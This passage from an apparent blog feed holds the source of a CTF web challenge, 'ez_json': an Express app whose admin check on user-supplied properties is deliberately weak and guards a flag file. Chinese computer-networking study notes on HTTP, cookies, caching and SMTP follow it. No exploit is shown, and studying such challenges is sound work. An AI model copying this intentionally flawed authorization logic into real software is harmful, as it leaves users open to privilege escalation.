class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_secret = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(session_secret));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: session_secret,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyArray</span>(<span class="params">arr1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(arr1.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr1.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr1[i] <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">            arr2[i] = <span class="title function_">copyArray</span>(arr1[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr2[i] = arr1[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/get_admin&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">name</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: req.<span class="property">body</span>.<span class="property">name</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> properties = req.<span class="property">body</span>.<span class="property">properties</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (properties[i] == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;cant set admin by self&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span> = <span class="title function_">copyArray</span>(properties);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Success&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;input username&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">__proto__</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>[i] == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">                    res.<span class="title function_">send</span>(data)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&quot;fail to open flag&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;not vm2 tester rights&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>提示说不是原型链污染，分析代码也得知并不是沙箱逃逸</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ez-json&quot;&gt;&lt;a href=&quot;#ez-json&quot; class=&quot;headerlink&quot; title=&quot;*ez_json&quot;&gt;&lt;/a&gt;*ez_json&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Scr1w平台" scheme="http://luffys93.github.io/categories/Scr1w%E5%B9%B3%E5%8F%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>计网学习笔记（2）</title>
    <link href="http://luffys93.github.io/2024/03/26/ComputerInternet/Computer-Internet2/"/>
    <id>http://luffys93.github.io/2024/03/26/ComputerInternet/Computer-Internet2/</id>
    <published>2024-03-26T13:35:40.000Z</published>
    <updated>2024-07-31T08:37:56.173Z</updated>
    
    <content type="html"><![CDATA[<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="应用层协议原理"><a href="#应用层协议原理" class="headerlink" title="应用层协议原理"></a>应用层协议原理</h2><h3 id="网络应用程序体系架构"><a href="#网络应用程序体系架构" class="headerlink" title="网络应用程序体系架构"></a>网络应用程序体系架构</h3><p>应用程序体系结构（application architecture）由应用程序研发者设计，规定了如何在各种端系统上组织这个应用程序。</p><p>目前的现代网络应用程序中一般会选择两种主流架构：==客户-服务器体系结构和对等（P2P）体系结构==</p><h4 id="客户-服务器体系结构"><a href="#客户-服务器体系结构" class="headerlink" title="客户-服务器体系结构"></a>客户-服务器体系结构</h4><p>服务器是一个==总是处于开机状态==的主机，它服务于来自许多其他称为<strong>客户</strong>的主机的请求。</p><h5 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h5><ol><li>两个或多个客户之间是不会直接建立通信的；</li><li>服务器具有固定的、周知的地址，即IP地址<span id="more"></span><h5 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h5></li></ol><p>Web、FTP（文件传输协议）、Telnet（一种远程登录的协议）、电子邮件……</p><h5 id="其他你需要知道的"><a href="#其他你需要知道的" class="headerlink" title="其他你需要知道的"></a>其他你需要知道的</h5><p>由于使用互联网的人很多，向服务器发送的请求也很多，想要一个服务器来服务所有请求是不现实的。</p><p>因此，<strong>数据中心</strong>的作用就体现出来了，它配备了大量的主机，用于创建一个强大的虚拟服务器。</p><p>它的应用想必都见过，例如搜索引擎baidu，谷歌；Internet商务亚马逊，阿里巴巴；社交网络Facebook、推特</p><h4 id="P2P体系结构"><a href="#P2P体系结构" class="headerlink" title="P2P体系结构"></a>P2P体系结构</h4><p>这个结构对位于数据中心的专用服务器具有很少的依赖（有时候可以没有），选用这种结构的应用程序在==间断连接的主机对之间使用直接通信==，这些主机对被称为<strong>对等方</strong>。</p><p>:::info</p><p>对等方的一些解释可以参考参考上一章<strong>网络的网络</strong>部分</p><p>:::</p><h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><ol><li>==自扩展性==。P2P网络是由许多用户节点组成的，当有新的用户加入时，服务的需求虽然在增加，但是系统整体的资源和服务能力也随之扩充，能较大程度上满足用户的需求。在服务器组成的P2P网络中，只需增加服务器就能完成平滑的扩容。</li><li>成本低。P2P网络或者应用程序一般是不需要庞大的服务器基础设施和服务器带宽（与客户-服务器相对）</li></ol><h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><p>站在操作系统的角度，进行通信的实际上是<strong>进程</strong>而并非程序。</p><p>在两个不同端系统上的进程，通过跨越计算机网络交换<strong>报文</strong>来进行通信。</p><h4 id="客户和服务器进程"><a href="#客户和服务器进程" class="headerlink" title="客户和服务器进程"></a>客户和服务器进程</h4><p>网络应用程序==由成对的进程组成，这些进程通过网络相互发送报文==。</p><p>在这一对进程中，我们将其中之一标记为<strong>客户</strong>，另一个则是<strong>服务器</strong>了。</p><h5 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h5><p>在Web的应用程序中，一个客户浏览器进程与一台服务器进程相互交换报文。此时浏览器就是客户进程，Web服务器就是服务器进程。</p><p>在P2P文件共享系统中，文件从一个对等方进程传输到另一个对等方进程。此时下载方被标识为客户，上传方则被标识为服务器。</p><h5 id="如何定义客户进程与服务器进程"><a href="#如何定义客户进程与服务器进程" class="headerlink" title="如何定义客户进程与服务器进程"></a>如何定义客户进程与服务器进程</h5><p>以下定义==基于一对进程之间的通信会话场景==中</p><p>客户：发起通话的进程。</p><p>服务器：在会话开始时等待联系的进程。</p><h4 id="进程与计算机网络之间的接口"><a href="#进程与计算机网络之间的接口" class="headerlink" title="进程与计算机网络之间的接口"></a>进程与计算机网络之间的接口</h4><p>进程通过一个<strong>套接字</strong>的软件接口向网络发送报文和从网络接收报文</p><p>下图是两个通过因特网通信的进程之间的套接字通信</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240326223829224.png" class="" title="image-20240326223829224"><p>在这个图中，套接字是同一台主机内应用层与运输层的接口，也是建立网络应用程序的可编程接口，因此也被称为<strong>网络应用程序接口</strong>（Application Programming Interface，API）</p><h5 id="应用程序开发者对套接字的管理"><a href="#应用程序开发者对套接字的管理" class="headerlink" title="应用程序开发者对套接字的管理"></a>应用程序开发者对套接字的管理</h5><p>从开发者的角度看，他们能够==控制套接字在应用层上的一切==。</p><p>对运输层的套接字的控制几乎是手足无措的，仅限于</p><ol><li>选择运输层协议</li><li>设定几个运输层参数，如最大报文长度</li></ol><h4 id="进程寻址"><a href="#进程寻址" class="headerlink" title="进程寻址"></a>进程寻址</h4><p>一台主机上运行的进程如果想要向另一台主机上运行的进程发送分组，则需要让接收进程有一个地址。</p><p>为了让接收进程被标识到，我们需要两种信息：</p><ol><li>主机的地址</li><li>在目的主机中指定接收进程的标识符</li></ol><p>在因特网中，==主机是由IP地址标识的==。</p><p>除了IP地址标识外，还需要==发送进程指定运行在接收主机的接收进程==。<strong>端口号</strong>的作用就在于此。</p><h3 id="可供应用程序使用的运输服务"><a href="#可供应用程序使用的运输服务" class="headerlink" title="可供应用程序使用的运输服务"></a>可供应用程序使用的运输服务</h3><p>在多种多样的运输服务中，我们可以通过四个方面对应用程序服务进行分类：==可靠数据传输，吞吐量，定时，安全性==</p><h4 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h4><h5 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h5><p>某个服务能够做一些工作来确保某应用程序的一端发送的数据正确，且能完全地交付给该应用程序的另一端。</p><h5 id="其他你可能要知道的"><a href="#其他你可能要知道的" class="headerlink" title="其他你可能要知道的"></a>其他你可能要知道的</h5><ol><li>运输层协议能够潜在地向应用程序提供一种重要服务，这种服务是进程到进程的可靠数据传输。发送进程只要将其数据传递进套接字，就可以完全相信该数据能够无差错地到达接收进程。</li><li>如果运输层不提供这种服务，那大概率会被依赖这种服务的应用所排斥，但可能会被容忍丢失的应用接受，如一些多媒体应用，它的部分数据丢失一般只会导致卡顿或者音频被干扰等问题，但问题不大</li></ol><h5 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h5><p>电子邮件，文件传输，金融应用等等</p><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>单位： 比特/秒 =&gt; bit/s</p><p><strong>带宽敏感的应用（bandwidth-sensitive application）</strong>：对吞吐量有要求的应用程序。</p><p><strong>弹性应用（elastic application）</strong>：说白了，能够根据带宽状态动态调整吞吐量。</p><h3 id="因特网提供的运输服务"><a href="#因特网提供的运输服务" class="headerlink" title="因特网提供的运输服务"></a>因特网提供的运输服务</h3><p>因特网为应用程序提供了两个运输层协议，分别为==UDP和TCP==。</p><p>附：应用程序的服务要求</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240403182749113.png" class="" title="image-20240403182749113"><h4 id="TCP服务"><a href="#TCP服务" class="headerlink" title="TCP服务"></a>TCP服务</h4><p>TCP服务的模型包括：==面向连接服务和可靠数据传输服务==</p><p>有拥塞控制机制</p><h4 id="UDP服务"><a href="#UDP服务" class="headerlink" title="UDP服务"></a>UDP服务</h4><p>UDP仅提供最小的服务，是无连接的，因此在进行连接的时候没有握手过程，且并不能保证报文能到达接收进程，到了也有可能是乱序的</p><p>没有拥塞控制机制（不过有的时候，实际的端到端吞吐量可能小于选定的任意速率，因为中间链路的带宽可能会受限或者拥塞导致的）</p><h4 id="因特网不提供的服务"><a href="#因特网不提供的服务" class="headerlink" title="因特网不提供的服务"></a>因特网不提供的服务</h4><p>运输层协议不提供吞吐量和定时保证的服务</p><p>下图是因特网应用所使用的协议</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240403191549255.png" class="" title="image-20240403191549255"><h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p>定义了运行在不同端系统上的应用程序进程如何相互传递报文。</p><ol><li>交换的报文类型，例如请求报文，响应报文</li><li>各种类型报文的语法，例如报文中的字段和字段的描述</li><li>字段的语义，即这些字段的信息的含义</li><li>确定一个进程什么时候，怎么发送报文，对报文响应的规则</li></ol><h3 id="这一章涉及到的网络应用"><a href="#这一章涉及到的网络应用" class="headerlink" title="这一章涉及到的网络应用"></a>这一章涉及到的网络应用</h3><p>Web、文件传输、电子邮件、目录服务、流式视频和P2P</p><h2 id="Web和HTTP"><a href="#Web和HTTP" class="headerlink" title="Web和HTTP"></a>Web和HTTP</h2><h3 id="HTTP概况"><a href="#HTTP概况" class="headerlink" title="HTTP概况"></a>HTTP概况</h3><p>==超文本运输协议（HyperText Transfer Protocol, HTTP）==由客户程序和服务器程序实现，它们通过交换HTTP报文进行会话。同时，HTTP定义了==这些报文的结构以及客户和服务器进行报文交换的方式==。</p><p>==Web页面（Web page，也叫文档）由对象组成==，而对象只是一个文件，例如HTML文件，JPEG图形等等。其中，大多数Web页面都会含有一个HTML文件和几个引用对象，其对象数量就是引用对象的数量加上HTML文件数（说白了就是N+1个对象）</p><p>==Web服务器==实现了HTTP的客户端（所以在Web环境中经常会交替使用”浏览器“和”客户“两种术语），也实现了HTTP的服务器端（用于存储Web对象，每个对象由URL寻址）</p><p>:::info</p><p>HTML基本文件是通过对象的URL地址来引用页面的其他对象，形如<code>http://www.example.com/path/to/sth</code>都是URL地址，其中<code>www.example.com</code>是主机名，而<code>/path/to/sth</code>是路径名</p><p>:::</p><p>HTTP定义了Web客户向Web服务器请求Web页面的方式，以及服务器向客户传送Web页面的方式，基本思想如下图：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408195027295.png" class="" title="image-20240408195027295"><ol><li>用户请求一个Web页面；</li><li>浏览器向服务器发出该页面中所包含对象的HTTP请求报文；</li><li>服务器接收请求并用包含这些对象的HTTP响应报文进行相应</li></ol><h4 id="无状态协议"><a href="#无状态协议" class="headerlink" title="无状态协议"></a>无状态协议</h4><p>HTTP服务器不保存关于用户的任何信息，这里涉及到一个关于HTTP的现象：==服务器向客户发送被请求的文件，但是不存储任何关于用户的状态信息==。</p><p>:::info</p><p>Web使用的是客户-服务器应用程序体系架构，其实看了图示也差不多可以想到了</p><p>:::</p><h3 id="非持续链接和持续链接"><a href="#非持续链接和持续链接" class="headerlink" title="非持续链接和持续链接"></a>非持续链接和持续链接</h3><h4 id="非持续连接（non-persistent-connection）"><a href="#非持续连接（non-persistent-connection）" class="headerlink" title="非持续连接（non-persistent connection）"></a>非持续连接（non-persistent connection）</h4><p>==每一个请求/响应对经过一个单独的TCP连接发送==。</p><p>假设URL为<code>http://www.example.com/path/to/sth</code>，且其中包含一个HTML文件和N个JPEG图形文件，我们来看看服务端向客户传送一个Web页面的步骤：</p><ol><li>HTTP客户进程在默认端口号80发起一个到服务器<code>http://www.example.com</code>的TCP连接，在客户与服务器上分别有一个套接字与该连接相关联；</li><li>HTTP客户经过自己的套接字向服务器发送一个HTTP请求报文，请求报文中包含了路径名<code>/path/to/sth</code>；</li><li>HTTP服务器进程经过自己的套接字接收该请求报文，从自己的存储器中检索对象<code>http://www.example.com/path/to/sth</code>，并将其封装到一个HTTP响应报文中；</li><li>HTTP服务器进程通知TCP断开TCP连接。（当然了，要等TCP确认客户已经收到完整的响应报文后，它才会断开连接）；</li><li>HTTP客户接收响应报文，TCP连接关闭。报文指出封装对象是一个HTML文件，客户从报文提取该文件，检查HTML文件后得到N个JPEG图形文件；</li><li>对每一个引用的JPEG图形对象重复前4个步骤。</li></ol><p>经过上述步骤，用户在请求该Web页面时，需要产生N+1个TCP连接</p><p>:::info 估算从请求到完全接收的时间</p><p><strong>往返时间（RTT，Round-Trip Time）</strong>：指一个短分组从客户到服务器然后再返回客户所花费的时间</p><p>RTT包括分组传播时延、分组在中间路由器和交换机上的排队时延和分组处理时延。</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408202857646.png" class="" title="image-20240408202857646"><p>（涉及到三次握手，这个后面再说）</p><ol><li>客户请求Web页面时，会先请求建立一个TCP连接。客户向服务器发送一个TCP报文段，服务器再向客户发送一个TCP报文段来作出请求与回应；（占用一个RTT）</li><li>客户发送一个HTTP请求报文，报文到达服务器后，服务器就会发送响应报文（占用一个RTT）</li><li>后面传输文件的事情就另算了</li></ol><p>因此总的时间是<code>2RTT + 传输文件的时间</code></p><p>:::</p><h4 id="持续连接（persistent-connection）"><a href="#持续连接（persistent-connection）" class="headerlink" title="持续连接（persistent connection）"></a>持续连接（persistent connection）</h4><p>==所有的请求/响应对经过相同的TCP连接发送==。</p><p>相对地，在这个方式下，服务器在发送响应后并不会通知TCP关闭连接，而是保持打开状态，因此后续的请求和响应报文能通过相同的连接进行传送。</p><p>说白了，按照上一个连接的例子，需要用到的TCP连接数就会从N+1个变成1个</p><p>:::warning no-icon</p><p>非持续连接的缺点：</p><ol><li>该方式下，两端需要为每一个请求的对象建立和维护一个全新的连接；</li><li>时间占用太多，每一个对象需要花费两倍RTT来创建TCP连接和请求接收。</li></ol><p>:::</p><h3 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h3><h4 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h4><p>拿书上的例子说说：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408204922748.png" class="" title="image-20240408204922748"><p>第一行为<strong>请求行（request line）</strong>，后面的全部为<strong>首部行（header line）</strong>。</p><p>上图可以看出，请求行有三个部分：方法字段、URL字段和HTTP版本字段。其中，请求方法有很多：==GET、POST、DELETE、PUT、HEAD==。</p><p>再来看看首部行：</p><ol><li>Host：指明对象所在的主机；</li><li>Connection：close代表非持续连接，open代表持续连接（我记得是open吧）；</li><li>User-Agent：指明用户代理，也相当于指明发送请求的浏览器的类型；</li><li>Accept-language：表示用户想得到该对象的语言版本，服务器不存在这样的对象就发送默认语言版本</li></ol><p>下图是请求报文的通用格式：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408205838564.png" class="" title="image-20240408205838564"><h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><p>接着拿书上的例子</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408205945431.png" class="" title="image-20240408205945431"><p>响应报文有三个部分：一个初始状态行（status line），若干个首部行（header line），实体体（entity body）</p><p>状态行包含三个信息：协议版本字段，状态码，状态信息</p><p>首部行：</p><ol><li>Connection：不赘述；</li><li>Date：服务器产生并发送报文的时间；</li><li>Server：表示报文是由某个服务器产生的；</li><li>Last-Modified：对象创建或者最后修改的日期和时间（这个后面再说）；</li><li>Content-Length：被发送对象中的字节数（应该是指实体体）；</li><li>Content-Type：指示实体体中的对象是什么类型的文本</li></ol><p>实体体包含了请求的对象本身（data data data……）</p><p>状态码有点不想说，我直接把官方的文档放这了 -&gt; <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">click me</a></p><h3 id="用户与服务器的交互：cookie"><a href="#用户与服务器的交互：cookie" class="headerlink" title="用户与服务器的交互：cookie"></a>用户与服务器的交互：cookie</h3><p>cookie==允许站点对用户进行追踪==。</p><p>至于有什么用，举个例子：我访问<code>github.com</code>，但我想访问之后直接到与我有关的界面，这样就可以省去登录步骤，这个时候cookie就发挥了作用，它会保持我在这个网站的登录状态，以防一些不必要的登录。</p><p>不过呢，不同的浏览器cookie肯定是不同的，例如火狐登录了csdn，之后就可以省去登录步骤；IE没有登陆过，必须要登录</p><p>当然，咱之前玩的小游戏有需要存档的，也用到了cookie</p><p>下图表示cookie跟踪用户的状态</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408211022491.png" class="" title="image-20240408211022491"><p>根据上图可以得知，cookie技术有四个组件：</p><ol><li>HTTP响应报文的一个cookie首部行；</li><li>HTTP请求报文的一个cookie首部行；</li><li>用户端系统中保留有一个cookie文件，由用户的浏览器管理；</li><li>Web站点的一个后端数据库</li></ol><p>:::info</p><p>cookie可以标识一个用户。用户首次访问某个站点时可能需要提供一个用户标识（例如名字），在后面的对话中，浏览器会向服务器传递一个cookie首部，从而向服务器标识了这个用户。</p><p>因此，cookie可以在无状态HTTP之上建立一个会话层。</p><p>:::</p><h3 id="Web缓存"><a href="#Web缓存" class="headerlink" title="Web缓存"></a>Web缓存</h3><p><strong>Web缓存器（Web cache）</strong>也叫<strong>代理服务器（proxy server）</strong>，它是能够代表初始Web服务器来满足HTTP请求的网络空间实体。</p><p>其中，Web缓存器有自己的磁盘存储空间，并在存储空间中保存最近请求过的对象的副本。</p><p>还是拿书上的例子，看下图：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409084203339.png" class="" title="image-20240409084203339"><p>现在客户配置的浏览器都可以使他们的HTTP请求首先指向Web缓存器，以<code>http://www.example.com/path/to/sth</code>为例，现在浏览器正在请求该对象，来看看都发生了什么：</p><ol><li>浏览器创建了一个到Web缓存器的TCP连接，并向Web缓存器中的对象发送一个HTTP请求；</li><li>Web缓存器接收请求，并检查是否存在该对象的副本。如果有，Web缓存器就返回包含该对象的HTTP响应报文，没有就进行下一步；</li><li>Web缓存器打开一个与该对象的初始服务器（<code>www.example.com</code>）的TCP连接，然后在这个连接上发送一个关于该对象的HTTP请求。收到请求后，初始服务器向Web缓存器发送包含该对象的HTTP响应；</li><li>Web缓存器接收到该对象后，它在本地存储空间存储一份副本，并向客户的浏览器发送该副本的HTTP响应报文。</li></ol><p>:::danger no-icon</p><p>在上述步骤中，Web缓存器既是客户，也是服务器。</p><p>:::</p><h3 id="条件GET方法"><a href="#条件GET方法" class="headerlink" title="条件GET方法"></a>条件GET方法</h3><p>和普通的GET方法有点区别，<strong>条件GET方法（conditional GET）</strong>在原先GET方法的基础上加了一个功能：==检查该对象是否是最新的==</p><p>如果一个请求报文中用到了GET方法，并且该报文的首部行还有包含If-Modified-Since，那么这个HTTP请求报文就是一个条件GET请求报文。</p><p>拿书上的例子简单举例，这个倒并不是很重要：</p><p>某个代理缓存器代表某个浏览器向某个Web服务器发送了一个请求报文</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409092203740.png" class="" title="image-20240409092203740"><p>然后，Web服务器发送了包含该对象的HTTP响应报文</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409092348120.png" class="" title="image-20240409092348120"><p>可以看出，缓存器接收了报文，也在本地存储了这个对象，同时也存储了该对象的最后修改日期。</p><p>一段时间后，另一个用户向这个缓存器请求同一个对象，由于该对象可能已经被修改，因此在用户请求后，该缓存器会向服务器发送一个条件GET请求来进行检查：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409093035321.png" class="" title="image-20240409093035321"><p>如果该对象没有修改，那么服务器就会向缓存器发送如下响应报文：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409093126679.png" class="" title="image-20240409093126679"><p>报文说明对象没有修改，缓存器可以使用这个对象，最后缓存器把这个对象的副本发送给用户</p><h2 id="因特网中的电子邮件"><a href="#因特网中的电子邮件" class="headerlink" title="因特网中的电子邮件"></a>因特网中的电子邮件</h2><p>这个简单说说就行，感觉不太重要</p><p>先上一个因特网电子邮件系统的总体概况图：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409104905295.png" class="" title="image-20240409104905295"><p>可以看到，电子邮件分为三个主要部分：==用户代理（user agent），邮件服务器（mail server），简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）==。</p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>==SMTP是因特网电子邮件中的主要协议==。它使用TCP可靠数据传输服务，从发送方的邮件服务器向接收方的邮件服务器发送邮件。</p><p>跟许多应用层协议一样，SMTP也有两个部分：运行在发送方邮件服务器的客户端，运行在接收方服务器的服务器端。</p><p>上一个发送端向接收端发送一个邮件的过程图：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409110157180.png" class="" title="image-20240409110157180"><ol><li>Alice调用邮件代理程序并提供Bob的邮件地址，撰写报文后指示代理发送报文；</li><li>Alice用户代理发送报文到她的邮件服务器，报文被放在报文队列当中；</li><li>Alice的邮件服务器的SMTP客户端发现了报文队列中的这个报文，于是就创建一个到Bob的邮件服务器的SMTP服务器的TCP连接；</li><li>经过初始的SMTP握手之后，SMTP客户通过该TCP连接发送Alice的报文；</li><li>Bob的邮件服务器上的SMTP的服务器接收该报文，然后该邮件服务器将报文放入Bob的邮箱中；</li><li>Bob调用用户代理阅读报文</li></ol><p>:::info</p><p>几个注意的点：</p><ol><li>SMTP一般不使用中间邮件服务器发送邮件；</li><li>接收端的邮件服务器在没有运行的情况下，发送报文会被保留在发送端并等待进行新的尝试，不会在中间的服务器做停留。</li></ol><p>:::</p><h3 id="与HTTP的对比"><a href="#与HTTP的对比" class="headerlink" title="与HTTP的对比"></a>与HTTP的对比</h3><h4 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h4><ol><li>HTTP和SMTP都是用于从一台主机向另一台主机传送文件；</li><li><del>持续的HTTP和SMTP都使用持续连接</del>（感觉像是废话……）</li></ol><h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ol><li>HTTP用于从Web服务器向Web客户（例如浏览器）传送对象（例如文件），而SMTP用于从一个邮件服务器向另一个邮件服务器传送文件；</li><li>HTTP主要是一种<strong>拉协议（pull protocol）</strong>，在方便的时候，用户可以使用HTTP从某个Web服务器拉取一些被装载的信息；SMTP主要是一种<strong>推协议（push protocol）</strong>，发送邮件的服务器把文件推向接收邮件的服务器，当二者需要建立TCP连接时，发送邮件的服务器必须为建立连接的发起者。</li><li>SMTP要求每个报文采用7比特ASCII码格式，HTTP则不受限制；</li><li>在处理包含文本和图形的文档时，HTTP将每个对象封装到对应的不同响应报文中（就是一对一封装），SMTP将所有的对象放在一个报文中。</li></ol><h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><p>不赘述，看看图就行</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409115819761.png" class="" 